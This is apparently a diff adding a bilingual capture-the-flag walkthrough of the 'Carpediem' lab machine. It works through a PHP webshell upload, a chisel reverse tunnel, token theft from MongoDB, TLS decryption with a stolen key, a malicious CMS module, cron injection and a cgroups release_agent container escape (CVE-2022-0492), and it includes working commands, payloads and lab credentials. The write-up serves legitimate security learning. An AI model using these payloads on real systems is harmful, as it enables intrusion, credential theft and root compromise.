+                <p>La vulnerabilidad es que Linux no verifica que quien modifica <code>release_agent</code> tiene los
+                    privilegios necesarios para ejecutar código en el host. Para montar cgroupfs se necesita
+                    <code>CAP_SYS_ADMIN</code>, pero es posible obtenerlo dentro del contenedor mediante
+                    <code>unshare()</code>.</p>
+
+                <h3>Explotación paso a paso</h3>
+                <p>Compruebo las capabilities actuales:</p>
+
+                <pre><code class="language-bash">capsh --print | grep cap_sys
+<span style="color:#98c379;"># CAP_SYS_ADMIN NO está presente en el set actual</span></code></pre>
+
+                <p>Uso <code>unshare</code> para crear nuevos namespaces y obtener <code>CAP_SYS_ADMIN</code>:</p>
+
+                <pre><code class="language-bash">unshare -UrmC bash</code></pre>
+
+                <pre><code class="language-bash">capsh --print | grep cap_sys_admin
+<span style="color:#98c379;"># cap_sys_admin ahora aparece en el Bounding set</span></code></pre>
+
+                <p>Monto el subsistema RDMA de cgroups:</p>
+
+                <pre><code class="language-bash">mount -t cgroup -o rdma cgroup /mnt</code></pre>
+
+                <pre><code class="language-bash">ls -lah /mnt
+<span style="color:#98c379;"># -rw-r--r-- 1 root root 0  notify_on_release</span>
+<span style="color:#98c379;"># -rw-r--r-- 1 root root 0  release_agent</span></code></pre>
+
+                <p>Creo un cgroup hijo y activo <code>notify_on_release</code>:</p>
+
+                <pre><code class="language-bash">mkdir /mnt/x
+echo 1 &gt; /mnt/x/notify_on_release</code></pre>
+
+                <p>Obtengo la ruta del host que mapea al filesystem del contenedor:</p>
+
+                <pre><code class="language-bash">host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo $host_path
+<span style="color:#98c379;"># /var/lib/docker/overlay2/e4ee513c84a45c4dc61a80642fbbddd4fd2d1145ec759bf4415b642bc17f383b/diff</span></code></pre>
+
+                <p>Apunto <code>release_agent</code> al archivo <code>cmd</code> que voy a crear en la raíz del
+                    contenedor (que en el host será esa ruta del overlay):</p>
+
+                <pre><code class="language-bash">echo "$host_path/cmd" &gt; /mnt/release_agent
+cat /mnt/release_agent
+<span style="color:#98c379;"># /var/lib/docker/overlay2/e4ee513c.../diff/cmd</span></code></pre>
+
+                <p>Creo el payload: asignar el bit SUID a una copia de bash en <code>/tmp</code> del host:</p>
+
+                <pre><code class="language-bash">echo -e <span style="color:#98c379;">'#!/bin/bash\n\ncp /bin/bash /tmp/xd && chmod u+s /tmp/xd'</span> &gt; /cmd
+chmod +x /cmd</code></pre>
+
+                <p>Disparo el payload escribiendo el PID del proceso actual en <code>cgroup.procs</code>. El proceso
+                    muere inmediatamente, el kernel detecta que el cgroup queda vacío, y ejecuta <code>release_agent</code>
+                    en el <strong>contexto del host</strong>:</p>
+
+                <pre><code class="language-bash">sh -c <span style="color:#98c379;">"echo \$\$ > /mnt/x/cgroup.procs"</span></code></pre>
+
+                <p>El flujo lógico es el siguiente:</p>
+
+                <pre><code class="language-plaintext">sh -c "echo $$ > cgroup.procs"
+│
+├─ $$ = PID propio del proceso
+│
+├─ escribe PID → kernel mueve ese PID al cgroup
+│
+└─ sh -c termina → PID muere
+          │
+          kernel: "el cgroup está vacío, notify_on_release=1"
+          │
+          ejecuta release_agent EN EL HOST (con privilegios de kernel)</code></pre>
+
+                <p>Desde el host, con el usuario <code>hflaccus</code>, verifico que se ha creado la bash SUID:</p>
+
+                <pre><code class="language-bash">ls -lah /tmp/xd
+<span style="color:#98c379;">-rwsr-xr-x 1 root root 1.2M May 10 14:37 xd</span></code></pre>
+
+                <p>La ejecuto con el flag <code>-p</code> para preservar el UID efectivo:</p>
+
+                <pre><code class="language-bash">hflaccus@carpediem:~$ /tmp/xd -p
+xd-5.0# whoami
+root</code></pre>
+
+                <p>Acceso root al host conseguido.</p>
+            </div>
+
+            <!-- ==================== ENGLISH ==================== -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The entry point was a PHP web portal at <code>portal.carpediem.htb</code>. The file upload
+                        endpoint <code>/classes/Users.php?f=upload</code> performed no extension validation, allowing a
+                        PHP webshell to be uploaded and executed as <code>www-data</code> inside a Docker container.</p>
+
+                    <p>From that container, I enumerated the internal Docker network (<code>172.17.0.0/24</code>) using a
+                        statically compiled <code>nmap</code> binary and set up a SOCKS tunnel with <code>chisel</code> to
+                        reach internal services. In the unauthenticated MongoDB instance I found Trudesk user access
+                        tokens, and reading the support tickets revealed VOIP credentials for a new employee.</p>
+
+                    <p>Using the <strong>Zoiper</strong> VOIP client I connected to the internal phone system and
+                        retrieved <code>hflaccus</code>'s initial credentials from a voicemail. With those I SSH'd into
+                        the host and captured Docker network traffic with <code>tcpdump</code>. The negotiated cipher was
+                        <code>TLS_RSA_WITH_AES_256_CBC_SHA256</code>, which lacks Perfect Forward Secrecy — importing the
+                        server's private key into Wireshark was enough to decrypt the traffic and extract
+                        <code>jpardella</code>'s credentials in plaintext.</p>
+
+                    <p>With admin access to <strong>BackdropCMS</strong> I uploaded a malicious ZIP module containing a
+                        PHP webshell and got RCE in that container as <code>www-data</code>. A cron script executed by
+                        <code>root</code> every ~30 seconds loaded Backdrop's <code>index.php</code>, of which I was
+                        the owner, so I injected PHP code to get a reverse shell as container root.</p>
+
+                    <p>Finally, <strong>CVE-2022-0492</strong> (privilege escalation via <code>cgroups v1
+                        release_agent</code>) allowed escaping the container and running commands on the host. I set the
+                        SUID bit on a bash copy in <code>/tmp</code> and gained root access on the host machine.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> PHP file upload webshell, chisel SOCKS proxy, internal
+                        network discovery with static nmap, unauthenticated MongoDB, VOIP with Zoiper, TLS traffic
+                        decryption (no PFS), BackdropCMS module upload RCE, cron abuse privesc, container escape via
+                        CVE-2022-0492 (cgroups release_agent).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <!-- RECON -->
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#56b6c2;">PORT</span>   <span style="color:#56b6c2;">STATE</span> <span style="color:#56b6c2;">SERVICE</span> <span style="color:#56b6c2;">VERSION</span>
+<span style="color:#e06c75;">22</span>/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
+<span style="color:#e06c75;">80</span>/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Comming Soon
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code></pre>
+
+                <p>Only SSH and HTTP. Visiting port 80 shows a "Coming Soon" page with little content:</p>
+
+                <img src="./media/image2.png" alt="carpediem.htb homepage showing a Coming Soon message" />
+
+                <p>I add <code>carpediem.htb</code> to <code>/etc/hosts</code> and fuzz for virtual hosts, finding one
+                    interesting result:</p>
+
+                <pre><code class="language-plaintext">portal.carpediem.htb  Status: 200  [Size: 31090]</code></pre>
+
+                <!-- WEB ENUM -->
+                <h2>Web Enumeration – portal.carpediem.htb</h2>
+                <p>This subdomain hosts a motorbike rental portal with a much larger attack surface. Directory fuzzing
+                    reveals the following relevant paths:</p>
+
+                <pre><code class="language-plaintext">admin         (Status: 301) → http://portal.carpediem.htb/admin/
+login.php     (Status: 200)
+uploads       (Status: 301) → http://portal.carpediem.htb/uploads/
+classes       (Status: 301) → http://portal.carpediem.htb/classes/
+registration.php (Status: 200)
+config.php    (Status: 200)</code></pre>
+
+                <p>The <code>/uploads</code> directory is immediately suspicious as it suggests the application accepts
+                    file uploads. The <code>/admin</code> path leads to an admin login panel for which I have no
+                    credentials yet.</p>
+
+                <p>Several URLs use a <code>?p=</code> parameter that includes PHP pages (e.g. <code>?p=bikes</code> or
+                    <code>?p=about</code>). This looks like an LFI, but attempting PHP wrappers/filters fails silently —
+                    the application likely filters these techniques intentionally.</p>
+
+                <p>Fuzzing under <code>/admin</code> finds among others:</p>
+
+                <pre><code class="language-plaintext">admin/maintenance  (Status: 301)
+admin/user         (Status: 301)
+admin/bookings     (Status: 301)
+admin/bike         (Status: 301)</code></pre>
+
+                <p>The path <code>/admin/maintenance/files</code> lists a file and shows a menu with View, Edit, Delete
+                    and Add buttons:</p>
+
+                <img src="./media/image3.png" alt="admin/maintenance/files interface showing the file listing with action buttons including Add" />
+
+                <!-- FILE UPLOAD WEBSHELL -->
+                <h2>PHP Webshell Upload – Filter Bypass</h2>
+                <p>The <em>Add</em> button calls <code>POST /classes/Users.php?f=upload</code>. Intercepting the request
+                    in Burp Suite I see it is sent with an empty body, which returns:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">"error"</span>: <span style="color:#98c379;">"multipart/form-data missing"</span></code></pre>
+
+                <p>I manually add a <code>Content-Type: multipart/form-data</code> header with a file field, but the
+                    server responds:</p>
+
+                <pre><code class="language-json">{<span style="color:#e06c75;">"error"</span>: <span style="color:#98c379;">"missing 'file_upload' in form-data"</span>}</code></pre>
+
+                <p>Renaming the form-data field to <code>file_upload</code> and uploading a <code>.php</code> file
+                    directly — with no extension validation on the server — succeeds:</p>
+
+                <pre><code class="language-json">{<span style="color:#e06c75;">"success"</span>: <span style="color:#98c379;">"uploads\/1777920540_xd.php uploaded"</span>}</code></pre>
+
+                <p>The uploaded file contains a simple one-liner webshell:</p>
+
+                <pre><code class="language-php"><span style="color:#c678dd;">&lt;?php</span> <span style="color:#61afef;">system</span>(<span style="color:#e06c75;">$_GET</span>[<span style="color:#98c379;">'cmd'</span>]); <span style="color:#c678dd;">?&gt;</span></code></pre>
+
+                <p>Browsing to <code>/uploads/1777920540_xd.php?cmd=id</code> confirms command execution:</p>
+
+                <img src="./media/image5.png" alt="Server response showing successful command execution via the uploaded PHP webshell, returning the output of the id command" />
+
+                <p>I send a reverse shell and gain access as <code>www-data</code>. The randomised hostname confirms I'm
+                    inside a Docker container:</p>
+
+                <pre><code class="language-bash">www-data@3c371615b7aa:/var/www/html/portal$</code></pre>
+
+                <!-- CONTAINER ENUM -->
+                <h2>Container Enumeration – Credentials and Internal Network</h2>
+                <p>I find hardcoded database credentials in <code>DBConnection.php</code>:</p>
+
+                <pre><code class="language-php"><span style="color:#c678dd;">private</span> <span style="color:#e06c75;">$host</span>     = <span style="color:#98c379;">'mysql'</span>;
+<span style="color:#c678dd;">private</span> <span style="color:#e06c75;">$username</span> = <span style="color:#98c379;">'portaldb'</span>;
+<span style="color:#c678dd;">private</span> <span style="color:#e06c75;">$password</span> = <span style="color:#98c379;">'J5tnqsXpyzkK4XNt'</span>;
+<span style="color:#c678dd;">private</span> <span style="color:#e06c75;">$database</span> = <span style="color:#98c379;">'portal'</span>;</code></pre>
+
+                <p>The <code>env</code> command also leaks the MySQL container address and root password:</p>
+
+                <pre><code class="language-bash"><span style="color:#e06c75;">MYSQL_PORT_3306_TCP_ADDR</span>=172.17.0.4
+<span style="color:#e06c75;">MYSQL_ENV_MYSQL_ROOT_PASSWORD</span>=3dQXeqjMHnq4kqDv</code></pre>
+
+                <p>To discover what else is on the Docker network I run a small bash ping sweep:</p>
+
+                <pre><code class="language-bash"><span style="color:#56b6c2;">time</span> <span style="color:#c678dd;">for</span> i <span style="color:#c678dd;">in</span> {1..254}; <span style="color:#c678dd;">do</span>
+  (ping -c 1 172.17.0.<span style="color:#e06c75;">${i}</span> | grep <span style="color:#98c379;">"bytes from"</span> | grep -v <span style="color:#98c379;">"Unreachable"</span> &amp;)
+<span style="color:#c678dd;">done</span></code></pre>
+
+                <p>Six hosts respond:</p>
+
+                <pre><code class="language-plaintext">64 bytes from 172.17.0.1
+64 bytes from 172.17.0.2
+64 bytes from 172.17.0.3
+64 bytes from 172.17.0.4
+64 bytes from 172.17.0.5
+64 bytes from 172.17.0.6</code></pre>
+
+                <p>One is the Docker host and one is the current container, leaving 4 to investigate.</p>
+
+                <!-- NMAP + CHISEL -->
+                <h2>Internal Service Discovery – Static Nmap and SOCKS Proxy</h2>
+                <p>I transfer a statically compiled <code>nmap</code> binary from
+                    <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">andrew-d/static-binaries</a>
+                    and run a full port scan:</p>
+
+                <pre><code class="language-bash">./nmap -p- --min-rate 10000 172.17.0.1-6</code></pre>
+
+                <pre><code class="language-plaintext">172.17.0.1  →  22/tcp  (ssh),   80/tcp  (http)
+172.17.0.2  →  21/tcp  (ftp),   80/tcp  (http),  443/tcp (https)
+172.17.0.3  →  27017/tcp        (mongodb)
+172.17.0.4  →  3306/tcp (mysql), 33060/tcp
+172.17.0.5  →  8118/tcp
+172.17.0.6  →  (current container)</code></pre>
+
+                <p>To investigate these services comfortably I set up a SOCKS tunnel using <code>chisel</code>.</p>
+
+                <p>On my machine:</p>
+                <pre><code class="language-bash">./chisel server -p 8000 --reverse</code></pre>
+
+                <p>On the victim container:</p>
+                <pre><code class="language-bash">./chisel client 10.10.14.142:8000 R:socks</code></pre>
+
+                <p>Once connected I configure <strong>FoxyProxy</strong> in Firefox to route only internal network
+                    traffic through the SOCKS5 proxy on port 1080:</p>
+
+                <img src="./media/image9.png" alt="FoxyProxy configuration in Firefox routing Docker internal network 172.17.0.x traffic through the SOCKS5 proxy" />
+
+                <p>And in <code>/etc/proxychains4.conf</code> I comment out the socks4 line and add:</p>
+                <pre><code class="language-plaintext">socks5 127.0.0.1 1080</code></pre>
+
+                <!-- INTERNAL SERVICES -->
+                <h2>Internal Service Investigation</h2>
+
+                <h3>172.17.0.2 – BackdropCMS (HTTPS) and FTP</h3>
+                <p>Port 443 hosts a <a href="https://backdropcms.org/">BackdropCMS</a> instance under the virtual host
+                    <code>backdrop.carpediem.htb</code>. I note this for later.</p>
+
+                <p>Anonymous FTP works but the directory is empty:</p>
+
+                <pre><code class="language-bash">proxychains ftp 172.17.0.2
+<span style="color:#98c379;"># user: anonymous / pass: (empty)</span>
+ftp&gt; ls -lah
+<span style="color:#56b6c2;">drwxr-xr-x  2  0  104  4096  May 26 2022  .</span>
+<span style="color:#56b6c2;">drwxr-xr-x  2  0  104  4096  May 26 2022  ..</span></code></pre>
+
+                <h3>172.17.0.3 – MongoDB (27017)</h3>
+                <p>No authentication required. I connect and find a <code>trudesk</code> database belonging to the
+                    open-source helpdesk platform <a href="https://trudesk.io/">Trudesk</a>:</p>
+
+                <pre><code class="language-bash">proxychains mongo 172.17.0.3</code></pre>
+
+                <pre><code class="language-javascript"><span style="color:#56b6c2;">&gt;</span> show dbs
+admin    0.000GB
+config   0.000GB
+local    0.000GB
+<span style="color:#e06c75;">trudesk  0.001GB</span>
+
+<span style="color:#56b6c2;">&gt;</span> use trudesk
+<span style="color:#56b6c2;">&gt;</span> show tables
+accounts  counters  departments  groups  messages
+notifications  priorities  roles  sessions  settings
+tags  teams  templates  <span style="color:#e06c75;">tickets</span>  tickettypes</code></pre>
+
+                <p>The <code>accounts</code> collection contains API access tokens for each user:</p>
+
+                <pre><code class="language-javascript"><span style="color:#56b6c2;">&gt;</span> db.accounts.find()
+
+<span style="color:#98c379;">// admin - Robert Frost</span>
+{ <span style="color:#e06c75;">"username"</span>: <span style="color:#98c379;">"admin"</span>, <span style="color:#e06c75;">"fullname"</span>: <span style="color:#98c379;">"Robert Frost"</span>,
+  <span style="color:#e06c75;">"accessToken"</span>: <span style="color:#98c379;">"22e56ec0b94db029b07365d520213ef6f5d3d2d9"</span> }
+
+<span style="color:#98c379;">// jhammond - Jeremy Hammond</span>
+{ <span style="color:#e06c75;">"username"</span>: <span style="color:#98c379;">"jhammond"</span>,
+  <span style="color:#e06c75;">"accessToken"</span>: <span style="color:#98c379;">"a0833d9a06187dfd00d553bd235dfe83e957fd98"</span> }
+
+<span style="color:#98c379;">// jpardella - Joey Pardella</span>
+{ <span style="color:#e06c75;">"username"</span>: <span style="color:#98c379;">"jpardella"</span>,
+  <span style="color:#e06c75;">"accessToken"</span>: <span style="color:#98c379;">"7c0335559073138d82b64ed7b6c3efae427ece85"</span> }
+
+<span style="color:#98c379;">// acooke - Adeanna Cooke</span>
+{ <span style="color:#e06c75;">"username"</span>: <span style="color:#98c379;">"acooke"</span>,
+  <span style="color:#e06c75;">"accessToken"</span>: <span style="color:#98c379;">"9c7ace307a78322f1c09d62aae3815528c3b7547"</span> }
+
+<span style="color:#98c379;">// svc-portal-tickets</span>
+{ <span style="color:#e06c75;">"username"</span>: <span style="color:#98c379;">"svc-portal-tickets"</span>,
+  <span style="color:#e06c75;">"accessToken"</span>: <span style="color:#98c379;">"f8691bd2d8d613ec89337b5cd5a98554f8fffcc4"</span> }</code></pre>
+
+                <p>Password hashes are <strong>bcrypt</strong> and don't crack in a reasonable time. The access tokens,
+                    however, are immediately usable.</p>
+
+                <h3>172.17.0.4 – MySQL</h3>
+                <p>Connecting with the root credentials found in the environment:</p>
+
+                <pre><code class="language-bash">proxychains mysql -h 172.17.0.4 --skip-ssl -u root -p</code></pre>
+
+                <pre><code class="language-sql"><span style="color:#c678dd;">show</span> databases;
+<span style="color:#98c379;">-- information_schema, mysql, performance_schema, portal, sys</span>
+
+<span style="color:#c678dd;">use</span> portal;
+<span style="color:#c678dd;">select</span> * <span style="color:#c678dd;">from</span> users;
+<span style="color:#98c379;">-- admin → jhammond@carpediem.htb | hash: b723e511b084ab84b44235d82da572f3 (MD5, doesn't crack)</span></code></pre>
+
+                <h3>172.17.0.5 – Trudesk (port 8118)</h3>
+                <p>Using the admin access token against the Trudesk API:</p>
+
+                <pre><code class="language-bash">proxychains curl 172.17.0.5:8118/api/v1/tickets \
+  -H <span style="color:#98c379;">"accesstoken: 22e56ec0b94db029b07365d520213ef6f5d3d2d9"</span> | jq</code></pre>
+
+                <p>Among the tickets I find a very revealing employee onboarding conversation:</p>
+
+                <pre><code class="language-json"><span style="color:#e06c75;">"subject"</span>: <span style="color:#98c379;">"New employee on-boarding - Horace Flaccus"</span>,
+<span style="color:#e06c75;">"issue"</span>:   <span style="color:#98c379;">"We have hired a new Network Engineer and need to get him set up..."</span>,
+
+<span style="color:#98c379;">// Robert Frost's reply:</span>
+<span style="color:#e06c75;">"comment"</span>: <span style="color:#98c379;">"Whats the last 4 digits of his employee ID so I can get his extension set up in the VoIP system?"</span>,
+
+<span style="color:#98c379;">// Adeanna Cooke's reply:</span>
+<span style="color:#e06c75;">"comment"</span>: <span style="color:#98c379;">"Last 4 of employee ID is 9650."</span>,
+
+<span style="color:#98c379;">// Robert Frost's reply:</span>
+<span style="color:#e06c75;">"comment"</span>: <span style="color:#98c379;">"He's all set up. Phone pin code will be 2022 and to get into voicemail he can dial *62.
+Also... we've been testing Zoiper with some of our end users."</span></code></pre>
+
+                <p>Information gathered:</p>
+                <ul>
+                    <li>New employee: <strong>Horace Flaccus</strong> → <code>hflaccus@carpediem.htb</code></li>
+                    <li>Last 4 digits of employee ID: <strong>9650</strong></li>
+                    <li>Phone PIN: <strong>2022</strong></li>
+                    <li>Voicemail access: dial <strong>*62</strong></li>
+                    <li>VOIP software: <strong>Zoiper</strong></li>
+                </ul>
+
+                <!-- VOIP -->
+                <h2>VOIP Credentials – Zoiper and the Voicemail</h2>
+                <p>I download Zoiper as a Debian package from
+                    <a href="https://www.zoiper.com/en/voip-softphone/download/current">zoiper.com</a> and configure
+                    the client to connect to the internal VOIP server reachable through the SOCKS proxy:</p>
+
+                <img src="./media/image4.png" alt="Zoiper VOIP client configured and connected to carpediem.htb's internal phone system" />
+
+                <p>I dial extension <code>*62</code> as mentioned in the ticket. The system prompts for a PIN — I enter
+                    <code>2022</code> — and access Horace Flaccus's voicemail, where a recording provides his initial
+                    server credentials:</p>
+
+                <img src="./media/image7.png" alt="Zoiper interface showing an active call to the *62 voicemail extension used to retrieve hflaccus credentials" />
+
+                <p>Password retrieved: <code>AuRj4pxq9qPk</code></p>
+
+                <p>I SSH into the host with <code>hflaccus:AuRj4pxq9qPk</code>.</p>
+
+                <!-- TCPDUMP + TLS -->
+                <h2>TLS Traffic Capture and Decryption</h2>
+                <p>From the host I enumerate locally open ports:</p>
+
+                <pre><code class="language-plaintext">tcp LISTEN  127.0.0.1:5038   (Asterisk Manager Interface)
+tcp LISTEN  127.0.0.1:8000
+tcp LISTEN  127.0.0.1:8001   (Trudesk)
+tcp LISTEN  127.0.0.1:8002   (BackdropCMS)</code></pre>
+
+                <p>Port 8000 returns Forbidden, 8001 is Trudesk, 8002 is Backdrop. The Docker network traffic, however,
+                    might contain useful data since the internal services communicate with each other. I capture traffic
+                    on the <code>docker0</code> interface:</p>
+
+                <pre><code class="language-bash">tcpdump -ni docker0 -s 65535 -w /tmp/xd.pcap</code></pre>
+
+                <p>After a while I stop the capture and download it:</p>
+
+                <pre><code class="language-bash">sshpass -p AuRj4pxq9qPk scp hflaccus@carpediem.htb:/tmp/xd.pcap .</code></pre>
+
+                <p>Opening the capture in Wireshark and going to <em>Statistics → Conversations</em> shows two flows:</p>
+
+                <img src="./media/image8.png" alt="Wireshark Conversations view showing two network flows: host to Backdrop (TLS encrypted) and Trudesk to MongoDB" />
+
+                <ul>
+                    <li><strong>Host → Backdrop</strong> (TLS encrypted traffic)</li>
+                    <li><strong>Trudesk → MongoDB</strong> (normal internal application traffic)</li>
+                </ul>
+
+                <p>The host-to-Backdrop flow is the interesting one. Trying to <em>Follow → TCP Stream</em> only shows
+                    encrypted data. Inspecting the <code>Client Hello</code> packet and the <code>Server Hello</code>
+                    response reveals the negotiated cipher suite:</p>
+
+                <pre><code class="language-plaintext">TLS_RSA_WITH_AES_256_CBC_SHA256 (0x003d)</code></pre>
+
+                <p>This cipher is <a href="https://scanigma.com/knowledge-base/tls/ciphersuite/tls-rsa-with-aes-256-cbc-sha256">outdated
+                    and problematic</a>: the RSA key exchange <strong>provides no Perfect Forward Secrecy (PFS)</strong>.
+                    This means that if an attacker captures encrypted communications and later obtains the server's private
+                    key, all previously recorded traffic can be decrypted.</p>
+
+                <p>That is exactly what I'll do. In <code>/etc/ssl/certs</code> on the host I find the Backdrop
+                    certificate's private key:</p>
+
+                <pre><code class="language-bash">ls -lah /etc/ssl/certs | grep -v '\->'
+<span style="color:#98c379;"># -rw-r--r-- 1 root root 1.3K Apr 7 2022 backdrop.carpediem.htb.crt</span>
+<span style="color:#e06c75;"># -rw-r--r-- 1 root root 1.7K Apr 7 2022 backdrop.carpediem.htb.key</span></code></pre>
+
+                <pre><code class="language-bash">sshpass -p AuRj4pxq9qPk scp hflaccus@carpediem.htb:/etc/ssl/certs/backdrop.carpediem.htb.key .</code></pre>
+
+                <p>In Wireshark I go to <em>Edit → Preferences → Protocols → TLS</em> and add the downloaded key to the
+                    RSA keys list:</p>
+
+                <img src="./media/image10.png" alt="Wireshark preferences showing the RSA key import for backdrop.carpediem.htb to decrypt the captured TLS traffic" />
+
+                <p>Now <em>Follow → TLS Stream</em> shows the communication in plaintext. In one of the requests I find
+                    a <code>jpardella</code> login:</p>
+
+                <pre><code class="language-http"><span style="color:#c678dd;">POST</span> <span style="color:#98c379;">/?q=user/login</span> HTTP/1.1
+Host: backdrop.carpediem.htb:8002
+Content-Type: application/x-www-form-urlencoded
+
+<span style="color:#e06c75;">name</span>=jpardella&amp;<span style="color:#e06c75;">pass</span>=<span style="color:#98c379;">tGPN6AmJDZwYWdhY</span>&amp;form_id=user_login&amp;op=Log+in
+
+<span style="color:#56b6c2;">HTTP/1.1 302 Found</span>
+Location: https://backdrop.carpediem.htb:8002/?q=admin/dashboard</code></pre>
+
+                <p>Credentials obtained: <code>jpardella:tGPN6AmJDZwYWdhY</code></p>
+
+                <p>These don't work for SSH or <code>su</code>, but they give admin access to BackdropCMS. I set up an
+                    SSH tunnel for convenient access:</p>
+
+                <pre><code class="language-bash">ssh hflaccus@carpediem.htb -L 8002:localhost:8002</code></pre>
+
+                <!-- BACKDROPCMS RCE -->
+                <h2>BackdropCMS RCE – Malicious ZIP Module Upload</h2>
+                <p>Accessing <code>https://localhost:8002/?q=admin/reports/status</code> with jpardella's credentials
+                    confirms the version:</p>
+
+                <pre><code class="language-plaintext">Backdrop CMS 1.21.4
+PHP Version: 8.0.8
+Apache/2.4.48</code></pre>
+
+                <p>BackdropCMS allows administrators to install modules by uploading a ZIP file. With no PHP code
+                    validation inside the module package, I can bundle a webshell. I create the minimal structure for a
+                    valid module:</p>
+
+                <pre><code class="language-plaintext">xd/
+├── xd.info    → name = Xd
+               description = Module
+               backdrop = 1.x
+               type = module
+               version = 1.0.0
+├── xd.module  → &lt;?php
+└── xd.php     → &lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+
+                <pre><code class="language-bash">zip -r xd.zip xd/</code></pre>
+
+                <p>I upload and install the module from the BackdropCMS admin panel:</p>
+
+                <img src="./media/image1.png" alt="BackdropCMS admin panel showing the installation of the malicious xd ZIP module containing the PHP webshell" />
+
+                <p>After enabling it, I browse to the module URL and confirm RCE:</p>
+
+                <img src="./media/image6.png" alt="Confirmed command execution via the PHP webshell in the xd BackdropCMS module, showing the output of the id command" />
+
+                <p>I send a reverse shell and gain access as <code>www-data</code> in the BackdropCMS container.</p>
+
+                <p>In <code>settings.php</code> I find the local MySQL credentials:</p>
+
+                <pre><code class="language-php"><span style="color:#e06c75;">$database</span> = <span style="color:#98c379;">'mysql://backdrop:34tB8RGtgtJjZ2Tz@localhost/backdrop'</span>;
+<span style="color:#e06c75;">$settings</span>[<span style="color:#98c379;">'hash_salt'</span>] = <span style="color:#98c379;">'AwMKmb6UJOTNWHUIK50-QhKGKWzLkjBBqNftvxhPKJA'</span>;</code></pre>
+
+                <p>The database only contains jpardella, whose credentials I already have. Nothing else useful.</p>
+
+                <!-- CRON PRIVESC -->
+                <h2>Container Root via Cron Abuse</h2>
+                <p>In <code>/opt</code> I find an interesting script called <code>heartbeat.sh</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#98c379;">#!/bin/bash</span>
+<span style="color:#98c379;">#Run a site availability check every 10 seconds via cron</span>
+
+<span style="color:#e06c75;">checksum</span>=($(/usr/bin/md5sum /var/www/html/backdrop/core/scripts/backdrop.sh))
+
+<span style="color:#c678dd;">if</span> [[ <span style="color:#e06c75;">$checksum</span> != <span style="color:#98c379;">"70a121c0202a33567101e2330c069b34"</span> ]]; <span style="color:#c678dd;">then</span>
+    <span style="color:#56b6c2;">exit</span>
+<span style="color:#c678dd;">fi</span>
+
+<span style="color:#e06c75;">status</span>=$(php /var/www/html/backdrop/core/scripts/backdrop.sh \
+         --root /var/www/html/backdrop https://localhost)
+
+grep <span style="color:#98c379;">"Welcome to backdrop.carpediem.htb!"</span> <span style="color:#98c379;">"$status"</span>
+
+<span style="color:#c678dd;">if</span> [[ <span style="color:#98c379;">"$?"</span> != 0 ]]; <span style="color:#c678dd;">then</span>
+    <span style="color:#98c379;"># something went wrong. restoring from backup.</span>
+    cp /root/index.php /var/www/html/backdrop/index.php
+<span style="color:#c678dd;">fi</span></code></pre>
+
+                <p>The script: (1) verifies with MD5 that <code>backdrop.sh</code> hasn't been tampered with, (2) runs
+                    it with PHP (which in turn loads Backdrop's <code>index.php</code>), and (3) if something fails,
+                    restores <code>index.php</code> from root's backup. Using <code>pspy64</code> I confirm it runs
+                    every ~30 seconds as <code>root</code>:</p>
+
+                <pre><code class="language-plaintext">CMD: UID=0 PID=1902 | /bin/bash /opt/heartbeat.sh
+CMD: UID=0 PID=1906 | /bin/bash /opt/heartbeat.sh</code></pre>
+
+                <p>File permissions:</p>
+
+                <pre><code class="language-bash">-rwxr-xr-x 1 root     root     510  Jun 23 2022  /opt/heartbeat.sh
+-rw-r--r-- 1 root     root     4.2K Mar 16 2022  /var/www/html/backdrop/core/scripts/backdrop.sh
+<span style="color:#e06c75;">-rw-r--r-- 1 www-data www-data 578  May 10 04:55 /var/www/html/backdrop/index.php</span></code></pre>
+
+                <p>I can't modify <code>heartbeat.sh</code> or <code>backdrop.sh</code>, but <strong>I own
+                    <code>index.php</code></strong>. Since root's script ultimately executes that file, I can inject PHP
+                    code that will run with root privileges.</p>
+
+                <p>Testing with a <code>touch</code> command first:</p>
+
+                <pre><code class="language-bash">echo <span style="color:#98c379;">'system("touch /tmp/xd");'</span> &gt;&gt; index.php</code></pre>
+
+                <p>Shortly after, I verify that root created the file:</p>
+
+                <pre><code class="language-bash">ls -lah /tmp/xd
+<span style="color:#98c379;">-rw-r--r-- 1 root root 0 May 10 05:15 xd</span></code></pre>
+
+                <p>Execution as root confirmed. I inject a reverse shell payload the same way and gain a root shell inside
+                    the BackdropCMS container.</p>
+
+                <!-- CONTAINER ESCAPE -->
+                <h2>Container Escape – CVE-2022-0492 (cgroups release_agent)</h2>
+                <p>From the container as root I find nothing new beyond what was already accessible as
+                    <code>www-data</code>. The next goal is escaping to the host. The applicable technique is
+                    <a href="https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/">CVE-2022-0492</a>, a
+                    vulnerability in <strong>cgroups v1</strong> that enables container escape.</p>
+
+                <h3>Understanding CVE-2022-0492</h3>
+                <p>The <code>release_agent</code> file is a cgroups v1 feature that lets administrators configure a
+                    program that runs when a process dies within that cgroup. When this happens, the kernel checks if
+                    <code>notify_on_release</code> is enabled and, if so, executes the binary specified in
+                    <code>release_agent</code> <strong>with elevated privileges against the host filesystem</strong>.</p>
+
+                <p>The vulnerability is that Linux does not verify that whoever modifies <code>release_agent</code> has
+                    those elevated privileges. Mounting cgroupfs requires <code>CAP_SYS_ADMIN</code>, but this can be
+                    obtained inside the container using <code>unshare()</code>.</p>
+
+                <h3>Step-by-Step Exploitation</h3>
+                <p>Check current capabilities — <code>CAP_SYS_ADMIN</code> is absent:</p>
+
+                <pre><code class="language-bash">capsh --print | grep cap_sys
+<span style="color:#98c379;"># CAP_SYS_ADMIN is NOT in the current set</span></code></pre>
+
+                <p>Use <code>unshare</code> to create new namespaces and gain <code>CAP_SYS_ADMIN</code>:</p>
+
